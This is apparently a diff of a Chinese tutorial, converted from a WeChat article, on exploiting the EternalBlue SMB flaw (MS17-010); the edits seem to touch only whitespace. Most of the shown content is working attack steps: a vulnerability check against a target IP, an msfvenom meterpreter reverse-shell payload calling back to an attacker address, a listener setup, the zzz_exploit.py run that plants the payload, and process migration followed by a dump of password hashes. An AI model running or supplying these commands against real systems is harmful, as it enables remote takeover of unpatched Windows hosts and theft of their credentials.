@@ -7,7 +7,7 @@ cve: "CVE-2017-0145"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H8cOsXmH0EzDPEBsPgvMrg)
 
-✎ 阅读须知
+✎ 阅读须知
 
   
 
@@ -29,21 +29,21 @@ cve: "CVE-2017-0145"
 其实永恒之蓝这个漏洞影响的范围非常广，大致有以下类型：
 
 ```
-Windows 2016 x64
-Windows 10 Pro Vuild 10240 x64
-Windows 2012 R2 x64
-Windows 8.1 x64
-Windows 2008 R2 SP1 x64
-Windows 7 SP1 x64
-Windows 2008 SP1 x64
-Windows 2003 R2 SP2 x64
-Windows XP SP2 x64
-Windows 8.1 x86
-Windows 7 SP1 x86
-Windows 2008 SP1 x86
-Windows 2003 SP2 x86
-Windows XP SP3 x86
-Windows 2000 SP4 x86
+Windows 2016 x64
+Windows 10 Pro Vuild 10240 x64
+Windows 2012 R2 x64
+Windows 8.1 x64
+Windows 2008 R2 SP1 x64
+Windows 7 SP1 x64
+Windows 2008 SP1 x64
+Windows 2003 R2 SP2 x64
+Windows XP SP2 x64
+Windows 8.1 x86
+Windows 7 SP1 x86
+Windows 2008 SP1 x86
+Windows 2003 SP2 x86
+Windows XP SP3 x86
+Windows 2000 SP4 x86
 
 
 ```
@@ -158,7 +158,7 @@ https://github.com/worawit/MS17-010
 将`github`上工具下载到本地之后，先试用脚本检测下是否存在永恒之蓝漏洞，在这里使用`Python2`：
 
 ```
-python checker.py 192.168.135.28
+python checker.py 192.168.135.28
 
 
 ```
@@ -176,7 +176,7 @@ python checker.py 192.168.135.28
 首先生成一个`exe`，等会回弹到本地来：
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.30.1.214  LPORT=7788  -f  exe  -o  7788.exe 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.30.1.214  LPORT=7788  -f  exe  -o  7788.exe 
 
 
 ```
@@ -186,10 +186,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.30.1.214  LPORT=7788 
 另外一侧，打开`msf`，准备接收会话：
 
 ```
-use exploit/multi/handler 
-set payload windows/meterpreter/reverse_tcp 
-set lhost 10.30.1.214 
-set lport 7788
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set lhost 10.30.1.214 
+set lport 7788
 run
 
 
@@ -206,7 +206,7 @@ run
 在这里注意：第一个`7788.exe`是要和你的脚本在同一个文件夹下，如果不在的话，可以写其他的绝对路径，比如：`/tmp/1.exe`，如果永恒之蓝漏洞执行成功的话，就会将这个文件传到靶机的`C`盘下，文件名就是`7788.exe`。修改好之后，准备执行：
 
 ```
-python zzz_exploit.py  192.168.135.28 netlogon(这个可以不带)
+python zzz_exploit.py  192.168.135.28 netlogon(这个可以不带)
 
 
 ```
@@ -225,13 +225,13 @@ python zzz_exploit.py  192.168.135.28 netlogon(这个可以不带)
 显示无法抓取，应该是进程问题，将进程由`x86`的迁移至`x64`的应该就可以了，查看下当前的进程：
 
 ```
-meterpreter > hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-meterpreter > getpid
-Current pid: 5616
-meterpreter > ps
+meterpreter > hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getpid
+Current pid: 5616
+meterpreter > ps
 
 
 ```
@@ -245,10 +245,10 @@ meterpreter > ps
 迁移到`308`上：
 
 ```
-meterpreter > migrate 308
-[*] Migrating from 5616 to 308...
-[*] Migration completed successfully.
-meterpreter > hashdump
+meterpreter > migrate 308
+[*] Migrating from 5616 to 308...
+[*] Migration completed successfully.
+meterpreter > hashdump
 admin:1000:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
